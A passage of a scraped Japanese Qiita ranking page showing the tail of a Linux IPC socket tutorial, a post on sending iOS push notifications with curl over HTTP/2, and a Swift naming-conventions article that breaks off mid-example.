    <span class="n">connect</span><span class="p">(</span><span class="n">socket_fd</span><span class="p">,</span> <span class="k">reinterpret_cast</span><span class="o">&lt;</span><span class="n">sockaddr</span><span class="o">*&gt;</span><span class="p">(</span><span class="o">&amp;</span><span class="n">name</span><span class="p">),</span> <span class="n">SUN_LEN</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">name</span><span class="p">));</span>
    <span class="cm">/* メッセージを送信 */</span>
    <span class="n">write_text</span><span class="p">(</span><span class="n">socket_fd</span><span class="p">,</span> <span class="n">message</span><span class="p">);</span>
    <span class="n">close</span><span class="p">(</span><span class="n">socket_fd</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">EXIT_SUCCESS</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>

<h1>
<span id="結論" class="fragment"></span><a href="#%E7%B5%90%E8%AB%96"><i class="fa fa-link"></i></a>結論</h1>

<p>ざっと、Linuxで提供されているIPCの方法を紹介してきました。<br>
これだけ方法があるとどれを使ったらいいか迷うと思います。<br>
そこがプログラマの腕の見せ所です。<br>
どの方法も一長一短あります。ソフトウェアの制約の下、どれが最適な方法なのを考え選択していきましょう。</p>

<h1>
<span id="参考文献" class="fragment"></span><a href="#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE"><i class="fa fa-link"></i></a>参考文献</h1>

<ul>
<li>
<a href="https://stackoverflow.com/questions/5656530/how-to-use-shared-memory-with-linux-in-c" rel="nofollow noopener" target="_blank">How to use shared memory with Linux in C</a><br>
共有メモリの例プログラム作成の参考にしました。</li>
<li>
<a href="https://stackoverflow.com/questions/2068498/how-to-choose-the-key-for-inter-processes-communication-in-linux" rel="nofollow noopener" target="_blank">How to choose the “Key” for inter-processes communication in Linux?</a>
共有メモリのキーの生成方法について参考にさせていただきました。</li>
<li><p><a href="https://users.cs.cf.ac.uk/Dave.Marshall/C/node27.html" rel="nofollow noopener" target="_blank"> Programming in C UNIX System Calls and Subroutines using C</a><br>
こちらも共有メモリのプログラムのサンプル作成に折に参考にさせていただきました。</p></li>
<li><p><a href="http://www.geeksforgeeks.org/named-pipe-fifo-example-c-program/" rel="nofollow noopener" target="_blank">Named Pipe or FIFO with example C program</a><br>
FIFIのサンプルプログラム作成に参考にしました。</p></li>
<li><p><a href="https://www.amazon.co.jp/dp/B0039KOA0O/ref=dp-kindle-redirect?_encoding=UTF8&amp;btkr=1" rel="nofollow noopener" target="_blank">Advanced Linux Programming</a> <br>
この記事の大部分はこの書籍の第5章を翻訳・アレンジして書いています。</p></li>
<li><p><a href="http://www.binarytides.com/socket-programming-c-linux-tutorial/" rel="nofollow noopener" target="_blank">Socket programming in C on Linux – tutorial</a> <br>
Socket通信のプログラムの参考にさせていただきました。</p></li>
</ul>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">45位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>218</kbd>
		<a target="_blank" href="https://qiita.com/yimajo/items/58565070d39acb4d5e71">macOS High SierraのcURLで手軽にPUSH通知が送れるようになった</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-09-27<br />00:16:46</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/16400.html">yimajo</a>(142件の記事)<br />(株式会社キュリオシティソフトウェア 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/16400/profile-images/1473681849">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[iOS]</b> <b>[curl]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>macOSをHigh Sierraにアップデートしたら、cURLのバージョンが7.54.0になっており、さらにHTTP/2の利用ができるようになっていました。</p>

<p>iOS10からは<a href="https://developer.apple.com/jp/documentation/NetworkingInternet/Conceptual/RemoteNotificationsPG/Chapters/APNsProviderAPI.html" rel="nofollow noopener" target="_blank">APNs Provider API</a>を利用したPUSH通知が受け取れていたため、pemファイルさえあれば、つまりはローカルのmacOSからiPhone実機へ向けたPUSH通知を送れます。</p>

<p>念のため、curlコマンドからnghttp2込みでビルドされているのを確認するのは-Vです。</p>

<div class="code-frame" data-lang="bash"><div class="highlight"><pre><span></span>$ curl -V
curl <span class="m">7</span>.54.0 <span class="o">(</span>x86_64-apple-darwin17.0<span class="o">)</span> libcurl/7.54.0 LibreSSL/2.0.20 zlib/1.2.11 nghttp2/1.24.0
Protocols: dict file ftp ftps gopher http https imap imaps ldap ldaps pop3 pop3s rtsp smb smbs smtp smtps telnet tftp
Features: AsynchDNS IPv6 Largefile GSS-API Kerberos SPNEGO NTLM NTLM_WB SSL libz HTTP2 UnixSockets HTTPS-proxy
</pre></div></div>

<p>ちなみにcurlでHTTP/2を使えればよかったので、Dockerを使った記事である<a href="https://qiita.com/fromkk/items/e1d8d8e302b49a372dd1" id="reference-53b09db8fbdce29d78fe">気軽にプッシュ通知のテストがしたい【iOS10以降対応】</a>を参考にAPNs Provider APIを利用するスクリプトapns.shを用意する例を示すと、下記のようになります。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>$ apns.sh key.pem iPhone実機のデバイストークン
</pre></div></div>

<p>これは引数でpemファイルのパス、デバイストークンを指定するようにしています。</p>

<div class="code-frame" data-lang="bash">
<div class="code-lang"><span class="bold">apns.sh</span></div>
<div class="highlight"><pre><span></span><span class="ch">#!/bin/sh</span>

<span class="nv">pemfile</span><span class="o">=</span><span class="nv">$1</span>
<span class="nv">token</span><span class="o">=</span><span class="nv">$2</span>
<span class="nv">pushData</span><span class="o">=</span><span class="s1">'{"aps": {"alert": "push dev test"}}'</span>

<span class="nv">bundleIdentifier</span><span class="o">=</span><span class="s2">"アプリのBundle ID"</span>

<span class="nv">appleUri</span><span class="o">=</span><span class="s2">"https://api.development.push.apple.com/3/device/"</span>

curl -v <span class="se">\</span>
-d <span class="s2">"</span><span class="nv">$pushData</span><span class="s2">"</span> <span class="se">\</span>
-H <span class="s2">"apns-priority: 10"</span> <span class="se">\</span>
-H <span class="s2">"apns-expiration: 0"</span> <span class="se">\</span>
-H <span class="s2">"apns-topic: </span><span class="si">${</span><span class="nv">bundleIdentifier</span><span class="si">}</span><span class="s2">"</span> <span class="se">\</span>
--http2 <span class="se">\</span>
--cert <span class="si">${</span><span class="nv">pemfile</span><span class="si">}</span> <span class="se">\</span>
<span class="si">${</span><span class="nv">appleUri</span><span class="si">}${</span><span class="nv">token</span><span class="si">}</span>
</pre></div>
</div>

<p>iOSアプリを開発するmacOS標準で用意してくれているcurlコマンドさえ叩けばいいという利点は大きいので、例えばプラグイン作ってmacアプリからPUSH通知呼び出すとか。ちょっと工夫すればいろんな遊びがありそうですね。</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">46位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>208</kbd>
		<a target="_blank" href="https://qiita.com/takasek/items/693c57dc9ddc6c1eb1ba">よりよいネーミングを目指して</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-10-12<br />17:42:43</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/34405.html">takasek</a>(31件の記事)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/34405/profile-images/1475591355">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[オブジェクト指向]</b> <b>[命名規則]</b> <b>[Swift]</b> <b>[ネーミング]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>この記事は、<a href="https://orecon.connpass.com/event/64285/" rel="nofollow noopener" target="_blank">俺コン Vol.1 / Day. 2 - connpass</a>での発表を、文章としてリライトしたものです。</p>

<p>スライド版:<br>
<a href="https://speakerdeck.com/takasek/20171003-number-orecon-ios-number-akibaswift" rel="nofollow noopener" target="_blank"><br>
<img src="https://camo.qiitausercontent.com/9f7055ea95b5d88a62a76ecd3500c2649aa843e8/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33343430352f63333133366433322d343163632d383639632d626435392d3539323732333436656435632e706e67" alt="image.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/34405/c3136d32-41cc-869c-bd59-59272346ed5c.png"><br>
https://speakerdeck.com/takasek/20171003-number-orecon-ios-number-akibaswift<br>
</a></p>

<h1>
<span id="前置き" class="fragment"></span><a href="#%E5%89%8D%E7%BD%AE%E3%81%8D"><i class="fa fa-link"></i></a>前置き</h1>

<p><a href="https://camo.qiitausercontent.com/7e7eb5fa8760fe682f33fad04642a63ffb7cba41/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33343430352f63656434306331662d393339322d313962302d383238642d3039396534666237353363302e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/7e7eb5fa8760fe682f33fad04642a63ffb7cba41/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33343430352f63656434306331662d393339322d313962302d383238642d3039396534666237353363302e706e67" alt="mujun.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/34405/ced40c1f-9392-19b0-828d-099e4fb753c0.png"></a></p>

<p>このアスキーアートは、「矛盾塊」と呼ばれるそうです。矛盾する情報が同時に与えられたとき、人は混乱してしまいます。ここはQiitaなのでコードで書きますと、</p>

<p><a href="https://camo.qiitausercontent.com/8b4864d2400fac04998c059ee436a2718d3d0759/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33343430352f35656665346532662d396336662d613563642d363036622d3935303031653530373231632e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/8b4864d2400fac04998c059ee436a2718d3d0759/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33343430352f35656665346532662d396336662d613563642d363036622d3935303031653530373231632e706e67" alt="mujun_code.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/34405/5efe4e2f-9c6f-a5cd-606b-95001e50721c.png"></a></p>

<p>コードになっても混乱しますね。<br>
こんな矛盾に溢れたコードを、業務では見たくないですよね。しかし矛盾塊コードは、程度の差はあれ、普段の業務コードの中にも潜んでいるものです。たとえば、</p>

<ul>
<li>
<code>update()</code> で特定の条件ではupdateせずに戻る</li>
<li>
<code>fetch()</code> といいつつUIの更新もしてる</li>
<li>名前に困って <code>func didReceive(hoge: Hoge)</code>
</li>
</ul>

<p>このような矛盾塊コードをそのままにしてしまう理由は、様々あるかと思います。めんどくさいとか、動いているコードに触りたくないとか、適切な名前が思いつかないとか、まあ全体を読めば理解できるし…とか。でもまあ、要は、バグってわけじゃないし、そこまで実害を感じないからこそ、見逃してしまうのでしょう。<br>
しかし、そこには明確な実害があります。</p>

<h2>
<span id="矛盾塊コードの実害1-コードリーティングを遅くする" class="fragment"></span><a href="#%E7%9F%9B%E7%9B%BE%E5%A1%8A%E3%82%B3%E3%83%BC%E3%83%89%E3%81%AE%E5%AE%9F%E5%AE%B31-%E3%82%B3%E3%83%BC%E3%83%89%E3%83%AA%E3%83%BC%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0%E3%82%92%E9%81%85%E3%81%8F%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>矛盾塊コードの実害1: コードリーティングを遅くする</h2>

<p>矛盾塊を見るときに受ける混乱を、心理学用語で「<a href="https://ja.wikipedia.org/wiki/%E3%82%B9%E3%83%88%E3%83%AB%E3%83%BC%E3%83%97%E5%8A%B9%E6%9E%9C" rel="nofollow noopener" target="_blank">ストループ効果</a>」というそうです。Wikipediaからの孫引きですが、</p>

<blockquote>
<p>例えば、色名を答える質問を行った場合、赤インクで書かれた「あか」の色名を答える場合より、青インクで書かれた「あか」の色名（『あお』）を答える方が時間がかかる事をいう。</p>
</blockquote>

<p>そう。矛盾塊コードは、コードリーディングを遅くする。これが心理学に裏付けされた真実なのです。</p>

<h2>
<span id="矛盾塊コードの実害2-関係ない処理が入り込む隙ができる" class="fragment"></span><a href="#%E7%9F%9B%E7%9B%BE%E5%A1%8A%E3%82%B3%E3%83%BC%E3%83%89%E3%81%AE%E5%AE%9F%E5%AE%B32-%E9%96%A2%E4%BF%82%E3%81%AA%E3%81%84%E5%87%A6%E7%90%86%E3%81%8C%E5%85%A5%E3%82%8A%E8%BE%BC%E3%82%80%E9%9A%99%E3%81%8C%E3%81%A7%E3%81%8D%E3%82%8B"><i class="fa fa-link"></i></a>矛盾塊コードの実害2: 関係ない処理が入り込む隙ができる</h2>

<p>矛盾塊コードには、もっと危険な実害があります。<br>
名前に混乱を来したまま開発を進めると、本来関係のない処理が入り込む隙に繋がります。つまり、型やメソッドの<strong>責務の範囲</strong>が定まらなかったり、型やメソッドが肥大化する・処理が各所に分散する。そして最悪、バグが仕込まれます。<br>
そうしてみると、さっき「まあいいかな」と思えたコードも、実は隙だらけだとわかってきます。</p>

<ul>
<li>
<code>update()</code> で特定の条件ではupdateせずに戻った結果、データ更新後も画面は更新されない。…と思ったら処理が途中でguardされていた</li>
<li>
<code>fetch()</code> といいつつUIの更新もした」結果、思わぬ時にAlertが表示される</li>
<li>名前に困って <code>func didReceive(hoge: Hoge)</code>と名付けた結果、 <code>isFetching: Bool</code> の管理箇所が分散してしまった</li>
</ul>

<p>全体を注意深く読めば防げると思われるかもしれませんが、そんなのは無理です。それよりは、<strong>注意深くなくても大丈夫な仕組みをつくる</strong>ほうが大事です。<br>
それが「しっかりしたネーミング」を徹底する理由です。<br>
良い名前をつけることの重要性、おわかりいただけたでしょうか。適切なネーミングは、コードを読みやすくするばかりでなく、設計を正しく保ち、バグの混入を防ぐのです。良い名前をつけましょう。</p>

<h1>
<span id="ではどうすれば" class="fragment"></span><a href="#%E3%81%A7%E3%81%AF%E3%81%A9%E3%81%86%E3%81%99%E3%82%8C%E3%81%B0"><i class="fa fa-link"></i></a>では、どうすれば？</h1>

<h2>
<span id="リーダブルコードより名前に情報を詰め込む" class="fragment"></span><a href="#%E3%83%AA%E3%83%BC%E3%83%80%E3%83%96%E3%83%AB%E3%82%B3%E3%83%BC%E3%83%89%E3%82%88%E3%82%8A%E5%90%8D%E5%89%8D%E3%81%AB%E6%83%85%E5%A0%B1%E3%82%92%E8%A9%B0%E3%82%81%E8%BE%BC%E3%82%80"><i class="fa fa-link"></i></a>「リーダブルコード」より：「名前に情報を詰め込む」</h2>

<p>ネーミングの指針として定評あるのが、「<a href="https://www.amazon.co.jp/dp/4873115655" rel="nofollow noopener" target="_blank">リーダブルコード ―より良いコードを書くためのシンプルで実践的なテクニック</a>」という本です。<br>
この本では「名前に情報を詰め込む」ための6つのテクニックを紹介しています。</p>

<ol>
<li>明確な単語を選ぶ</li>
<li>汎用的な名前を避ける（あるいは、使う状況を選ぶ）</li>
<li>抽象的な名前よりも具体的な名前を使う</li>
<li>接尾辞や接頭辞を使って情報を追加する</li>
<li>名前の長さを決める</li>
<li>名前のフォーマットで情報を伝える</li>
</ol>

<hr>

<h3>
<span id="名前に情報を詰め込む明確な単語を選ぶ" class="fragment"></span><a href="#%E5%90%8D%E5%89%8D%E3%81%AB%E6%83%85%E5%A0%B1%E3%82%92%E8%A9%B0%E3%82%81%E8%BE%BC%E3%82%80%E6%98%8E%E7%A2%BA%E3%81%AA%E5%8D%98%E8%AA%9E%E3%82%92%E9%81%B8%E3%81%B6"><i class="fa fa-link"></i></a>「名前に情報を詰め込む」①明確な単語を選ぶ</h3>

<p>まず最初のテクニックが「明確な単語を選ぶ」こと。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="c1">// ❌</span>
<span class="n">HogeStorage</span><span class="p">.</span><span class="kr">set</span><span class="p">(</span><span class="n">fuga</span><span class="p">)</span>

<span class="c1">// ⭕️</span>
<span class="n">HogeStorage</span><span class="p">.</span><span class="n">store</span><span class="p">(</span><span class="n">fuga</span><span class="p">)</span>
</pre></div></div>

<p>たとえばストレージに対してなら、setという無味乾燥な単語よりは、storeという単語のほうがイメージしやすくなります。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="c1">// ❌</span>
<span class="n">RxSwift</span><span class="p">.</span><span class="n">Observable</span>

<span class="c1">// ⭕️</span>
<span class="n">RxSwift</span><span class="p">.</span><span class="n">Single</span><span class="p">`</span> <span class="c1">// as you can!</span>
</pre></div></div>

<p>また、RxSwiftではObservable型が広く使われていますが、もし一度しかイベントの発生しないストリームであれば、ObservableよりもSingle型を使った方が、その意図が明確になります。</p>

<p>また、Swiftには引数ラベルがあります。これを活用しましょう。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="c1">// ❌️</span>
<span class="n">employees</span><span class="p">.</span><span class="n">remove</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">view</span><span class="p">.</span><span class="n">dismiss</span><span class="p">(</span><span class="kc">false</span><span class="p">)</span>
<span class="kd">let</span> <span class="nv">text</span> <span class="p">=</span> <span class="n">words</span><span class="p">.</span><span class="bp">split</span><span class="p">(</span><span class="mi">12</span><span class="p">)</span>

<span class="c1">// ⭕️</span>
<span class="n">employees</span><span class="p">.</span><span class="n">remove</span><span class="p">(</span><span class="n">at</span><span class="p">:</span> <span class="n">x</span><span class="p">)</span>
<span class="n">view</span><span class="p">.</span><span class="n">dismiss</span><span class="p">(</span><span class="n">animated</span><span class="p">:</span> <span class="kc">false</span><span class="p">)</span>
<span class="kd">let</span> <span class="nv">text</span> <span class="p">=</span> <span class="n">words</span><span class="p">.</span><span class="bp">split</span><span class="p">(</span><span class="n">maxSplits</span><span class="p">:</span> <span class="mi">12</span><span class="p">)</span>

<span class="c1">// ※出典: https://swift.org/documentation/api-design-guidelines/</span>
</pre></div></div>

<p><code>remove(x)</code> と言われると、xという要素を削除するのかと思ってしまいます。しかし、atというラベルを入れ、<code>remove(at: x)</code> とするることで、x番目の要素を削除するという意図が明確になります。</p>

<hr>

<h3>
<span id="名前に情報を詰め込む汎用的な名前を避けるあるいは使う状況を選ぶ" class="fragment"></span><a href="#%E5%90%8D%E5%89%8D%E3%81%AB%E6%83%85%E5%A0%B1%E3%82%92%E8%A9%B0%E3%82%81%E8%BE%BC%E3%82%80%E6%B1%8E%E7%94%A8%E7%9A%84%E3%81%AA%E5%90%8D%E5%89%8D%E3%82%92%E9%81%BF%E3%81%91%E3%82%8B%E3%81%82%E3%82%8B%E3%81%84%E3%81%AF%E4%BD%BF%E3%81%86%E7%8A%B6%E6%B3%81%E3%82%92%E9%81%B8%E3%81%B6"><i class="fa fa-link"></i></a>「名前に情報を詰め込む」②汎用的な名前を避ける（あるいは、使う状況を選ぶ）</h3>

<p>続いてのテクニックが「汎用的な名前を避ける」ことです。ViewControllerのプロパティに、marginと、defaultSizeがあったとします。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="c1">// ❌</span>
<span class="kr">final</span> <span class="kd">class</span> <span class="nc">HogeViewController</span> <span class="p">{</span>
    <span class="kd">private</span> <span class="kd">let</span> <span class="nv">margin</span><span class="p">:</span> <span class="n">CGFloat</span> <span class="p">=</span> <span class="mf">2.0</span>
    <span class="kd">private</span> <span class="kd">let</span> <span class="nv">defaultSize</span> <span class="p">=</span> <span class="bp">CGSize</span><span class="p">(</span><span class="n">width</span><span class="p">:</span> <span class="mi">100</span><span class="p">,</span> <span class="n">height</span><span class="p">:</span> <span class="mi">50</span><span class="p">)</span>
    <span class="p">...</span>
<span class="p">}</span>
</pre></div></div>

<p>なんのマージンとサイズやねん、って感じですよね。このような名前は、避けましょう。<br>
ただし、汎用的な名前が常にNGというわけではありません。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="c1">// ⭕️</span>
<span class="kd">func</span> <span class="nf">calculateComponentWidth</span>
<span class="p">(</span><span class="n">paralleling</span> <span class="n">contentSizes</span><span class="p">:</span> <span class="p">[</span><span class="bp">CGSize</span><span class="p">])</span> <span class="p">-&gt;</span> <span class="n">CGFloat</span> <span class="p">{</span>
    <span class="k">return</span> <span class="n">contentSizes</span><span class="p">.</span><span class="bp">reduce</span><span class="p">(</span><span class="n">margin</span><span class="p">)</span> <span class="p">{</span> <span class="n">result</span><span class="p">,</span> <span class="n">size</span> <span class="k">in</span>
        <span class="kd">let</span> <span class="nv">margin</span><span class="p">:</span> <span class="n">CGFloat</span> <span class="p">=</span> <span class="mi">2</span>
        <span class="n">result</span> <span class="o">+</span> <span class="n">size</span><span class="p">.</span><span class="n">width</span> <span class="o">+</span> <span class="n">margin</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kd">var</span> <span class="nv">userID</span><span class="p">:</span> <span class="nb">Int</span><span class="p">?</span> <span class="p">{</span>
    <span class="k">switch</span> <span class="kc">self</span><span class="p">.</span><span class="n">userState</span> <span class="p">{</span>
    <span class="k">case</span> <span class="p">.</span><span class="n">id</span><span class="p">(</span><span class="n">id</span><span class="p">):</span> <span class="k">return</span> <span class="n">id</span>
    <span class="k">case</span> <span class="p">.</span><span class="n">entity</span><span class="p">(</span><span class="n">e</span><span class="p">):</span> <span class="k">return</span> <span class="n">e</span><span class="p">.</span><span class="n">id</span>
    <span class="k">case</span> <span class="p">.</span><span class="n">unavailable</span><span class="p">:</span> <span class="k">return</span> <span class="kc">nil</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div></div>

<p>メソッドの中など、スコープが狭く限定的な場合には、汎用的な名前はむしろ良いものです。<br>
また、Enum の associated value を取り出すときなどに、変数が一時的なものだと示すために、あえて雑な名前をつけるのもアリだと思います。</p>

<hr>

<h3>
<span id="名前に情報を詰め込む抽象的な名前よりも具体的な名前を使う" class="fragment"></span><a href="#%E5%90%8D%E5%89%8D%E3%81%AB%E6%83%85%E5%A0%B1%E3%82%92%E8%A9%B0%E3%82%81%E8%BE%BC%E3%82%80%E6%8A%BD%E8%B1%A1%E7%9A%84%E3%81%AA%E5%90%8D%E5%89%8D%E3%82%88%E3%82%8A%E3%82%82%E5%85%B7%E4%BD%93%E7%9A%84%E3%81%AA%E5%90%8D%E5%89%8D%E3%82%92%E4%BD%BF%E3%81%86"><i class="fa fa-link"></i></a>「名前に情報を詰め込む」③抽象的な名前よりも具体的な名前を使う</h3>

<p>テクニック3番目。「抽象的な名前よりも具体的な名前を使う」。まずは悪い例のメソッドの、インタフェースだけごらんください。HogeListViewControllerに生えているメソッドです。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="c1">// ❌</span>
<span class="kd">class</span> <span class="nc">HogeListViewController</span> <span class="p">:</span> <span class="bp">UIViewController</span> <span class="p">{</span>
    <span class="p">...</span>
    <span class="kd">func</span> <span class="nf">fetch</span><span class="p">()</span>
    <span class="kd">func</span> <span class="nf">fetchBackground</span><span class="p">()</span>
    <span class="kd">func</span> <span class="nf">fetchReally</span><span class="p">(</span><span class="kc">_</span> <span class="n">id</span><span class="p">:</span> <span class="nb">String</span><span class="p">,</span> <span class="n">show</span><span class="p">:</span> <span class="nb">Bool</span><span class="p">)</span>
    <span class="p">...</span>
<span class="p">}</span>
</pre></div></div>

<p><code>fetch</code> 、 <code>fetchBackground</code> , <code>fetchReally</code> 。<br>
どれがどういう役割を持ったものだか、ぱっと理解できるでしょうか。 <code>fetchReally</code> があるということは、普通の <code>fetch</code> はリアリーじゃないんでしょうか。 <code>bakcground</code> ってどういうことでしょうか。謎は深まるばかりです。<br>
実装の中身を見てみます。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="kd">class</span> <span class="nc">HogeListViewController</span> <span class="p">:</span> <span class="bp">UIViewController</span> <span class="p">{</span>

    <span class="c1">/// 通信して、失敗したらアラートを表示する</span>
    <span class="kd">func</span> <span class="nf">fetch</span><span class="p">()</span> <span class="p">{</span>
        <span class="n">fetchReally</span><span class="p">(</span><span class="n">textField</span><span class="p">.</span><span class="n">text</span><span class="p">!,</span> <span class="n">show</span><span class="p">:</span> <span class="kc">true</span><span class="p">)</span>
    <span class="p">}</span>

    <span class="c1">/// 通信して、失敗してもアラートは表示しない</span>
    <span class="kd">func</span> <span class="nf">fetchBackground</span><span class="p">()</span> <span class="p">{</span>
        <span class="n">fetchReally</span><span class="p">(</span><span class="n">textField</span><span class="p">.</span><span class="n">text</span><span class="p">!,</span> <span class="n">show</span><span class="p">:</span> <span class="kc">false</span><span class="p">)</span>
        <span class="c1">// 👆どうやら「アラートを表示しない」からbackgroundというらしい。嘘だろ!?</span>
    <span class="p">}</span>

    <span class="kd">func</span> <span class="nf">fetchReally</span><span class="p">(</span><span class="kc">_</span> <span class="n">id</span><span class="p">:</span> <span class="nb">String</span><span class="p">,</span> <span class="n">show</span><span class="p">:</span> <span class="nb">Bool</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">api</span><span class="p">.</span><span class="n">fetch</span><span class="p">(</span><span class="n">id</span><span class="p">)</span> <span class="p">{</span> <span class="p">[</span><span class="kr">weak</span> <span class="kc">self</span><span class="p">]</span> <span class="n">models</span> <span class="k">in</span>
            <span class="kc">self</span><span class="p">?.</span><span class="n">didReceive</span><span class="p">(</span><span class="n">models</span><span class="p">:</span> <span class="n">models</span><span class="p">,</span> <span class="n">showsAlertIfFailed</span><span class="p">:</span> <span class="n">show</span><span class="p">)</span>
        <span class="p">}</span>
        <span class="c1">// 👆「具体的な通信処理が書いてある」からreallyというらしい</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div></div>

<p>蓋を開けてみると、 <code>fetch</code> と <code>fetchBackground</code> は、どちらも <code>fetchReally</code> を呼ぶ処理が1行書いてあるだけでした。違いは、 <code>fetch</code> では通信失敗時のアラートを出すけれど、 <code>fetchBackground</code> では出さないらしいです。アラートを出さないから「バックグラウンド」というメソッド名…嘘だろって感じです。<br>
あと <code>Really</code> については…おそらく、開発初期にあったのは <code>fetch</code> メソッドだけで、 <code>fetchBackground</code> の誕生時に通信処理を切り出したものの、元メソッドをリネームしなかった結果こんな名前になっちゃったんでしょう。<br>
が、経緯はともかく、今目の前にあるのは、わけのわからない矛盾塊です。<br>
<code>fetch</code> と <code>fetchBackground</code> の違いが、アラートの出し分けの有無なのであれば、それを具体的な名前で表すべきです。また、<br>
 <code>Really</code> という副詞は何も言っていないのと変わりません。<br>
こうしましょう。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="c1">// ❌</span>
<span class="kd">func</span> <span class="nf">fetch</span><span class="p">()</span>
<span class="kd">func</span> <span class="nf">fetchBackground</span><span class="p">()</span>
<span class="kd">func</span> <span class="nf">fetchReally</span><span class="p">(</span><span class="kc">_</span> <span class="n">id</span><span class="p">:</span> <span class="nb">String</span><span class="p">,</span> <span class="n">show</span><span class="p">:</span> <span class="nb">Bool</span><span class="p">)</span>

<span class="c1">// ⭕️</span>
<span class="kd">func</span> <span class="nf">startFetchingHogesWithFailureAlert</span><span class="p">()</span>
<span class="kd">func</span> <span class="nf">startFetchingHogesWithoutFailureAlert</span><span class="p">()</span>
<span class="kd">func</span> <span class="nf">fetchHoges</span><span class="p">(</span><span class="n">withID</span> <span class="n">id</span><span class="p">:</span> <span class="nb">String</span><span class="p">,</span> <span class="n">showsAlertIfFailed</span><span class="p">:</span> <span class="nb">Bool</span><span class="p">)</span>
</pre></div></div>

<p>これなら、初めて読む人でも理解できる、具体的な名前になります。</p>

<hr>

<h3>
<span id="名前に情報を詰め込む接尾辞や接頭辞を使って情報を追加する" class="fragment"></span><a href="#%E5%90%8D%E5%89%8D%E3%81%AB%E6%83%85%E5%A0%B1%E3%82%92%E8%A9%B0%E3%82%81%E8%BE%BC%E3%82%80%E6%8E%A5%E5%B0%BE%E8%BE%9E%E3%82%84%E6%8E%A5%E9%A0%AD%E8%BE%9E%E3%82%92%E4%BD%BF%E3%81%A3%E3%81%A6%E6%83%85%E5%A0%B1%E3%82%92%E8%BF%BD%E5%8A%A0%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>「名前に情報を詰め込む」④接尾辞や接頭辞を使って情報を追加する</h3>

<p>4番目のテクニック。「接尾辞や接頭辞を使って情報を追加する」についてです。<br>
以下に示すのは、URLエンコードされた文字列をデコードする一連の処理です。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="c1">// ❌️</span>
<span class="kd">let</span> <span class="nv">text1</span> <span class="p">=</span> <span class="s">"100%25%E5%8B%87%E6%B0%97"</span>
<span class="kd">let</span> <span class="nv">text2</span> <span class="p">=</span> <span class="n">text1</span><span class="p">.</span><span class="n">removingPercentEncoding</span><span class="p">!</span> <span class="c1">// "100%勇気"</span>
<span class="kd">let</span> <span class="nv">text3</span> <span class="p">=</span> <span class="n">text2</span><span class="p">.</span><span class="n">removingPercentEncoding</span><span class="p">!</span> <span class="c1">// CRASH😣</span>

<span class="c1">// ⭕️</span>
<span class="kd">let</span> <span class="nv">encodedText</span> <span class="p">=</span> <span class="s">"100%25%E5%8B%87%E6%B0%97"</span>
